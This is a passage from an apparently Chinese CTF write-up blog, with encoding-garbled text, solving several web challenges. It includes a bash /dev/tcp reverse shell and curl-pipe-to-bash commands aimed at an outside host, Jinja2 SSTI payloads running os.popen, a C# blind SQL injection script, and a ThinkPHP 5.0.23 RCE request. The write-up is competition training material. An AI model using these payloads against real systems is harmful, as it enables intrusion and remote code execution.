5px;">Cookie</span></p><p>æ‰“å¼€é¡µé¢ä¹‹åæ˜¯ä¸€ä¸ªâ€œLogin Fuckerâ€ã€‚éšæ‰‹å…ˆ confirm ä¸€ä¸ªï¼Œç„¶åçœ‹å®Œä¸€æ‰‹è¯´æ˜å»çœ‹äº†è¿™ä¸ªé¡µé¢çš„æºä»£ç ï¼Œæ‰¾åˆ°äº† <code>test.php</code> è¿™ä¸ªé¡µé¢ï¼Œ<del>ç–¯ç‹‚å°è¯•æ³¨å…¥</del>ç„¶åçœ‹äº†ä¸€æ‰‹é¡µé¢æºç å‘ç°æ ¹æœ¬æ²¡æœ‰å¯ä»¥å›æ˜¾çš„åœ°æ–¹ã€‚ <span class="heimu" title="QAQ">æ²¡é”™ï¼Œæ¯”èµ›çš„æ—¶å€™è¯•äº†å¾ˆä¹…æ³¨å…¥æ‰å‘ç°æ˜¯ä¸ªå›ºå®šçš„ alertï¼Œç„¶åå°±æ²¡æ€è·¯äº†ã€‚</span></p><p>å›åˆ°æœ€å¼€å§‹çš„é¡µé¢å‘ç°äº†æœ‰ä¸ª Cookie å¾ˆå¥‡æ€ªï¼Œå¤åˆ¶ä¸‹æ¥ Base64 ä¸€é¡¿æ€¼ä¹‹åå¯ä»¥å‘ç°æ˜¯ <code>user = æäº¤æ—¶é—´æˆ³</code>ã€‚ å¯èƒ½æ˜¯å¹³æ—¶å¥‡æ€ªçš„ä»£ç å†™å¤šäº†ï¼Œè§‰å¾—è¿™ä¸ªå¹¶æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œäºæ˜¯æ¯”èµ›æ—¶å°±æ”¾è¿‡å®ƒäº†ã€‚ï¼ˆå°±æ˜¯è¿™æ ·å¡äº†å·®ä¸å¤šä¸€å¤©ï¼‰</p><p>å…¶å®åº”è¯¥æ˜¯æŠŠ <code>test.php</code> çš„ url confirm è¿›å»ï¼Œç„¶å <code>document.cookie=&quot;dXNlcg=&quot;</code> æŠŠè¿™ä¸ª Cookie ç½®ç©ºå†åˆ·æ–°å°±èƒ½è¾¾åˆ° 99%+ çš„æˆåŠŸç‡ï¼Œç„¶åå† check ä¸€ä¸‹å°±èƒ½æ‹¿åˆ°ä¸‹ä¸€æ­¥çº¿ç´¢ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Burst successed! The passwd is av11664517@1583985203.</span><br></pre></td></tr></table></figure><p>ä¸€çœ‹å°±çŸ¥é“æ˜¯ Bilibili çš„ av å·ï¼Œæ‰¾åˆ°å¯¹åº”è§†é¢‘å†æŒ‰æ—¶é—´æˆ³æ‰¾è¯„è®ºå°±èƒ½æ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;Quantum_Mechanics_really_Ez&#125;</span><br></pre></td></tr></table></figure><h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Reverse Shell</span></p><p>æ‰“å¼€é¡µé¢ä¹‹åæ ¹æ®æç¤ºæ‹¿åˆ°äº† <code>.index.php.swp</code> è¿™ä¸ªæ–‡ä»¶ã€‚æ¯”èµ›çš„æ—¶å€™è¸©äº†ä¸ªå‘ï¼Œç›´æ¥ç”¨ Windows çš„è®°äº‹æœ¬æ‰“å¼€äº†ï¼Œç„¶ååªæ‹¿åˆ°ä¸€åŠæºç ï¼Œç»“æœæ ¹æœ¬å®¡è®¡ä¸å‡ºæ¥ï¼ˆå°‘äº†æœ€ä¸Šé¢çš„ä¸€åŠ <code>if</code> ï¼‰ï¼Œå½“æ—¶è¿˜ä»¥ä¸ºä¹Ÿæ˜¯è€ƒç‚¹æ¥ç€ã€‚æ­£ç¡®çš„å§¿åŠ¿åº”è¯¥æ˜¯æ‰¾ä¸ª vim ç„¶åç”¨ <code>vim -r</code> æ¢å¤æ–‡ä»¶æ¥æ‹¿åˆ°æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$girl</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec(<span class="variable">$girl</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨å¾®å®¡è®¡äº†ä¸€æ³¢ï¼Œå‘ç°å¾ˆå¤šå‘½ä»¤éƒ½ç›´æ¥æ»¤æ‰äº†ï¼Œä½†æ˜¯é¢˜ç›®å« shellã€‚äºæ˜¯æœäº†ä¸€æ³¢åå¼¹shellï¼Œæ‰¾åˆ°äº†<a href="https://www.jianshu.com/p/6aca9b29514d">è¿™ä¸ª</a>ã€‚ä½†æ˜¯è¿˜å°‘äº†ä¸€ç‚¹ä¸œè¥¿ï¼Œå°±æ˜¯å¦‚ä½•æŠŠåå¼¹ shell çš„å‘½ä»¤ä¼ ä¸Šå»ï¼Œè¿™é‡Œæ‰¾åˆ°äº†ä¸¤æ¡å¯è¡ŒæŒ‡ä»¤ï¼Œä½†æ˜¯é¶æœºæ²¡å¾— wgetï¼Œæ‰€ä»¥ç”¨ curlã€‚é¦–å…ˆæŠŠæŒ‡ä»¤å†™åœ¨ä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œè¿™é‡Œæˆ‘å†™åœ¨ <code>lemonshell.txt</code> ä¸­ï¼Œå†…å®¹å¦‚ä¸‹ã€‚è¿™é‡Œçš„ç«¯å£å’Œ IP å¯ä»¥åœ¨ç»ˆç«¯ä¸­ç”¨ <code>ifconfig</code> æŸ¥è¯¢ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.93.139&#x2F;8210 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>ç„¶åå†ç”¨ <code>nc -lvp 8210</code> ç›‘å¬ <code>8210</code> ç«¯å£ã€‚å›åˆ°ç½‘é¡µç«¯ï¼Œå®¡è®¡ä»£ç å¯ä»¥å¾—å‡ºæ˜¯è¦ä¼ å…¥ä¸€ä¸ª <code>girl_friend</code> çš„å‚æ•°ï¼Œå…¶åœ¨ä¸€ç³»åˆ—è¿‡æ»¤ä¹‹åè¢«æ‰§è¡Œã€‚æ‰€ä»¥ POST å‚æ•°å¯ä»¥è¿™æ ·å†™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;When there is wget</span><br><span class="line">girl_friend&#x3D;wget â€“q â€“O 174.1.93.139&#x2F;lemonshell.txt|bash</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;When there is no wget, use curl</span><br><span class="line">girl_friend&#x3D;curl 174.1.93.139&#x2F;lemonshell.txt|bash</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆåŠŸäº†å°±èƒ½åœ¨ç›‘å¬ç«¯å£çš„ç»ˆç«¯çœ‹åˆ°å›æ˜¾ï¼Œå¤§æ¦‚åƒè¿™æ ·ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">connect to [174.1.93.139] from 6005-d5c879a9-8350-4539-b26c-f102bcd90b88.1.8tv0l2tbgn7e5fs3p1k8rfnny.ctfd_swarm [174.1.93.128] 43370</span><br><span class="line">bash: cannot set terminal process group (170): Not a tty</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-4.4$</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æ‰¾ flag å•¦ã€‚é¦–å…ˆä¸€æ‰‹ <code>cat /flag</code> ç„¶åæ²¡æœ‰æ‹¿åˆ° flagã€‚äºæ˜¯å¼€å§‹ <code>find / -name flag</code>ï¼Œä¸€å¼€å§‹æ²¡æœ‰æ‰¾åˆ°ï¼Œå› ä¸ºä¸€å † Permission Denied æˆ‘ä»¥ä¸ºæ²¡å¾—ã€‚ç„¶å<a href="https://duitutu.cn">å †å †</a>æé†’æˆ‘è¯´ find å¾—ç­‰æ¯”è¾ƒä¹…ã€‚äºæ˜¯ç­‰äº†ä¸€ä¼šå„¿ï¼Œfind è¿”å›äº†è¿™ä¸ª <code>/etc/demo/P3rh4ps/love/you/flag</code>ï¼Œäºæ˜¯é¡ºåˆ©æ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ed2e8ade-b5d4-4164-8154-6432592a8466&#125;</span><br></pre></td></tr></table></figure><h3 id="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"><a href="#å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€" class="headerlink" title="å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€"></a>å‡çŒªå¥—å¤©ä¸‹ç¬¬ä¸€</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p><p>ä¸€æ‰“å¼€é¡µé¢ï¼Œä¸€è‚¡ç²¾è‡´çš„ç”»é£æ‰‘é¢è€Œæ¥(x éšæ‰‹æ¥äº†ä¸ªè´¦å·å¯†ç ç™»å½•ï¼Œå‘ç°å±…ç„¶æˆäº†ï¼Œåˆ°äº† <code>profile.php</code>ï¼Œç„¶åçœ‹äº†ä¸€æ‰‹æºç ï¼Œå‘ç°å•¥éƒ½æ²¡æœ‰ï¼Œå†çœ‹äº†ä¸€æ‰‹ Cookie ä¹Ÿæ²¡æœ‰å‘ç°ï¼Œè¯·æ±‚å¤´ä¹Ÿæ²¡æœ‰ä¸œè¥¿ã€‚ï¼ˆé™·å…¥åƒµå±€ï¼‰</p><p>æƒ³åˆ°æµè§ˆå™¨æ²¡åŠæ³•æŠ“ 302 å•¥çš„ï¼Œå°±æ‰“å¼€äº† Fiddlerï¼Œé¡ºæ‰‹æŠ“äº†ä¸€æ³¢ç™»å½•çš„åŒ…ï¼Œåœ¨è·³è½¬é¡µé¢çš„å“åº”æºç å‘ç°äº†ç‚¹ä¸œè¥¿ï¼Œå‡ºç°äº†ä¸ª <code>L0g1n.php</code>ã€‚äºæ˜¯æŠŠå®ƒæ‰“å¼€ï¼Œé¡µé¢æç¤ºé”™è¯¯ï¼Œé¡ºæ‰‹çœ‹äº†æ³¢æºç ï¼Œå‘ç°è¦æ”¹ Cookieã€‚ç…§ç€å‰é¢çš„å¥—è·¯ç®—äº†ä¸€ä¸‹ç¬¦åˆè¦æ±‚çš„æ—¶é—´çš„æ—¶é—´æˆ³ï¼Œç”¨ <code>document.cookie=&quot;time=4740774808&quot;</code> æ”¹å®Œä¹‹ååˆ·æ–°ã€‚è·Ÿç€é¡µé¢æç¤ºè®¾ç½®ä¸€ç³»åˆ— Headerã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Contiki&#x2F;1.0 (Commodore 64; http:&#x2F;&#x2F;dunkels.com&#x2F;adam&#x2F;contiki&#x2F;)</span><br><span class="line">Cookie: time&#x3D;4740774808</span><br><span class="line">via: y1ng.vip</span><br><span class="line">from: root@gem-love.com</span><br><span class="line">referer: gem-love.com</span><br><span class="line">x-real-ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¹‹åä¼šå¾—åˆ° <code>Sorry, even you are good at http header, you&#39;re still not my admin. Althoungh u found me, u still dont know where is flag</code> çš„æç¤ºï¼Œäºæ˜¯çœ‹äº†ä¸€æ³¢ Fiddler ä¸Šçš„å“åº”ï¼Œå‘ç°äº†ä¸€æ®µæ³¨é‡Šã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ZmxhZ3s1NmVjMTNmZS03Mzk1LTRlY2MtYmIxYS0zMmNjZTQ1NzNjZGZ9Cg==--&gt;</span></span><br></pre></td></tr></table></figure><p>å°†å®ƒ Base64 ç¼–ç è½¬æ¢ä¹‹åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;56ec13fe-7395-4ecc-bb1a-32cce4573cdf&#125;</span><br></pre></td></tr></table></figure><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SSTI</span></p><p>æ‰“å¼€é¡µé¢ä¹‹åéšæ‰‹è¾“äº†ä¸ª P3ï¼Œå¾—åˆ°çš„ç»“æœæ˜¯ <code>P3&#39;s girlfirend is : P3</code>ã€‚éšæ‰‹çœ‹äº†çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°äº† hint <code>&lt;!--ssssssti &amp; a little trick --&gt;</code>ï¼Œç„¶åå°è¯•ç€æ„é€ äº†ä¸ª <code>&#123;&#123;5 * 7&#125;&#125;</code>ï¼Œå¾—åˆ°äº† 35 çš„é¢„æœŸç»“æœï¼Œç„¶åå†æ„é€ äº†ä¸ª <code>&#123;&#123;6 * '7'&#125;&#125;</code> å¾—åˆ°äº† 777777 çš„é¢„æœŸç»“æœï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ Twig/Jinja2 ç±»å‹çš„æ¨¡æ¿ã€‚</p><p>å…ˆæ„é€ ä¸€æ³¢å‚æ•°æ‰¾ä¸€ä¸‹ flag çš„ä½ç½®ï¼Œ<code>.../qaq?name=&#123;&#123; config.__class__.__init__.__globals__['os'].popen('find / -name flag').read() &#125;&#125;</code>ï¼Œå¾—åˆ°çš„è¿”å›å€¼æ˜¾ç¤º flag å°±åœ¨æ ¹ç›®å½•ã€‚äºæ˜¯ç›´æ¥æ„é€  <code>cat /flag</code> å°±èƒ½å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39648fcb-2a51-47ac-b651-8aa0d5ddecef&#125;</span><br></pre></td></tr></table></figure><p><a href="https://duitutu.cn">å †å †</a>è·Ÿæˆ‘è¯´è¿‡è¿™é¢˜è¿˜æœ‰ä¸ªå…³é”®å­—è¿‡æ»¤çš„ç²¾é«“æ“ä½œï¼ˆå¯æƒœåœ¨ BUUCTF ä¸Šæ²¡ä½œç”¨äº†ï¼‰ï¼Œäºæ˜¯æˆ‘åœ¨è¿™é‡Œæ¨¡æ‹Ÿä¸€ä¸‹ç»•è¿‡è¿‡æ»¤çš„æ“ä½œï¼Œå³å°†è¿‡æ»¤çš„å­—ç¬¦ç”¨å…¶ä»–å­—ç¬¦æ›¿æ¢ï¼Œè¿™é‡Œä»¥ flag =&gt; LEMON æ“ä½œã€‚æˆ‘æ‰¾åˆ°äº†ä¸€ä¸ªå¾ˆå¥½ç”¨çš„æ›¿æ¢æŒ‡ä»¤ï¼š<a href="https://blog.csdn.net/qq_36142062/article/details/80747461">sed</a>ã€‚å› æ­¤ï¼Œpayload å¯ä»¥è¿™æ ·å†™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;qaq?name&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;flag|sed &quot;s&#x2F;flag&#x2F;LEMON&#x2F;g&quot;&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ flag ä¼šå˜æˆè¿™æ ·ï¼Œå°±è§£å†³äº†è¿‡æ»¤çš„é—®é¢˜ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEMON&#123;39648fcb-2a51-47ac-b651-8aa0d5ddecef&#125;</span><br></pre></td></tr></table></figure><h3 id="ç®€å•æ³¨å…¥"><a href="#ç®€å•æ³¨å…¥" class="headerlink" title="ç®€å•æ³¨å…¥"></a>ç®€å•æ³¨å…¥</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>è¿™é¢˜æ¯”èµ›çš„æ—¶å€™ç–¯ç‹‚è¯•äº†å¥½ä¹…ï¼Œæˆ‘è®°å¾—å½“æ—¶å¥½åƒè¯´ä¸è¦æ‰«ç›®å½•æ¥ç€ï¼Œç»“æœå°±æ²¡æƒ³ç‰¹æ®Šæ–‡ä»¶ï¼Œå…¶å® robots.txt é‡Œé¢è—ç€ hint.txt ç„¶åæœ‰ä¸ªæç¤ºç›´æ¥ç»™å‡ºäº†æŸ¥è¯¢çš„è¯­å¥ <code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code>ã€‚ä½†æ˜¯è¯•äº†å¾ˆä¹…å‘ç°å®Œå…¨æ²¡å¾—å›æ˜¾ï¼Œé™¤äº†å›ºå®šçš„é‚£ä¸€å¥ï¼ˆè¯´åˆ°è¿™é‡Œï¼Œæˆ‘æƒ³é²¨äº† HackBar æ’ä»¶ï¼‰ã€‚æŸ¥äº†ä¸€æ³¢ä¹‹åçŸ¥é“äº†åæ–œæ çš„å¥—è·¯ï¼Œç„¶åä½¿ç”¨ /**/ ä»£æ›¿ç©ºæ ¼æ„é€ äº† <code>username=admin\&amp;password=or/**/ascii(substr(password,1,1))&gt;1#</code> è¿™æ ·çš„è¯·æ±‚ï¼Œç”¨æŸåœ¨çº¿å·¥å…·å‘é€è¯·æ±‚ä¹‹åå¾—åˆ°äº†ä¸ä¸€æ ·çš„ç»“æœï¼Œäºæ˜¯å°±ä¸Šäº†ä¸€æ³¢ç›²æ³¨è„šæœ¬ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> Flurl.Http;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFdo</span> &#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> BEGIN_ASCII = <span class="number">32</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> END_ASCII = <span class="number">127</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">string</span> URL = <span class="string">&quot;URL_HERE&quot;</span>;</span><br><span class="line">            <span class="built_in">int</span> position = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">string</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                position++;</span><br><span class="line">                <span class="built_in">int</span> _begin = BEGIN_ASCII;</span><br><span class="line">                <span class="built_in">int</span> _end = END_ASCII;</span><br><span class="line">                <span class="keyword">while</span> (_begin &lt; _end)&#123;</span><br><span class="line">                    <span class="built_in">int</span> _mid = (_begin + _end) / <span class="number">2</span>;</span><br><span class="line">                    <span class="built_in">string</span> data = <span class="string">&quot;username=admin\\&amp;password=or/**/ascii(substr(password,&quot;</span> + position + <span class="string">&quot;,1))&gt;&quot;</span> + _mid + <span class="string">&quot;#&quot;</span>;</span><br><span class="line">                    <span class="built_in">string</span> _result = URL.WithHeaders(<span class="keyword">new</span> &#123;Content_Type=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;)</span><br><span class="line">                                        .PostStringAsync(data).ReceiveString().Result;</span><br><span class="line">                    <span class="keyword">if</span> (_result.Contains(<span class="string">&quot;BJD needs to be stronger&quot;</span>))&#123;</span><br><span class="line">                        _begin = _mid + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        _end = _mid;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (_begin != BEGIN_ASCII &amp;&amp; _end != END_ASCII)&#123;</span><br><span class="line">                    result += (<span class="built_in">char</span>)_begin;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ç•ªæ“ä½œå¾—åˆ°äº†å¯†ç  <code>OhyOuFOuNdit</code>ï¼Œç™»å½•ä¹‹åå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12781fb2-7b4d-48ff-8540-1cc663189d9a&#125;</span><br></pre></td></tr></table></figure><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>æ‰“å¼€é¡µé¢ä¹‹åå‘ç° ThinkPHPï¼Œè¿™æ³¢æç¤ºååˆ†æ˜æ˜¾ã€‚äºæ˜¯ä¸€å¥—æ“ä½œï¼Œå‘ç°æŠ¥é”™äº†ï¼Œä½†æ˜¯æ‹¿åˆ°äº†å…·ä½“çš„ç‰ˆæœ¬å· 5.0.23ã€‚ä¸€é¡¿æœç´¢ä¹‹åæ‰¾åˆ°äº†å‘½ä»¤æ‰§è¡Œçš„ payloadã€‚äºæ˜¯æŠ„ä¸€æ³¢ä½œä¸šï¼Œå‘ <code>.../index.php?s=captcha</code> POST <code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code> æˆåŠŸå‘ç°æ ¹ç›®å½•çš„ flagã€‚äºæ˜¯å†æ„é€ ä¸€æ³¢ <code>cat /flag</code> å°±å¾—åˆ°äº† flagã€‚ è¿™é‡Œé¡ºå¸¦è´´ä¸€æ³¢å‚è€ƒèµ„æ–™ <a href="http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/">One</a> <a href="https://blog.csdn.net/qq_38807738/article/details/86777541">Two</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bcd83ed3-ec7d-4397-9e2c-d06a4245f0e6&#125;</span><br></pre></td></tr></table></figure><h3 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h3><p>æ°¦ï¼Œè¿™é¢˜å…¶å®åªæœ‰ä¸€å¼€å§‹çš„ç‚¹æˆ‘æ˜¯ä¸çŸ¥é“çš„ã€‚<code>ffifdyop</code> è¿™ä¸ªå­—ç¬¦ä¸²è¢« MD5 æ‘˜è¦ä¹‹å hex è½¬ ASCII å¯ä»¥æ„æˆä¸€ä¸ª <code>or</code>ï¼Œå› æ­¤å¯ä»¥è¾¾æˆæ­£ç¡®çš„ç»“æœã€‚è¿‡äº†è¿™ä¸€ä¸ªç‚¹ä¹‹åå¯ä»¥åœ¨ä¸‹ä¸€ä¸ªé¡µé¢çš„æºç ç§æ‰¾åˆ°ä¸€æ®µæ³¨é‡Šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ³¢ç›´æ¥æ„é€  <code>a[]=1&amp;b[]=2</code> å°±èƒ½é€šè¿‡ã€‚ç¬¬ä¸‰ä¸ªé¡µé¢çš„ <code>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))</code> ä¹Ÿå¯ç”¨ä¸€æ ·çš„æ–¹æ³•ç»•è¿‡ï¼Œä»è€Œå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;Md_five_is_fun&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ— pjaxçš„æ•´ä½“é®ç½©æŠ˜è…¾è®°å½•</title>
      <link href="/zh-CN/posts/c2e31117.html"/>
      <url>/zh-CN/posts/c2e31117.html</url>
      
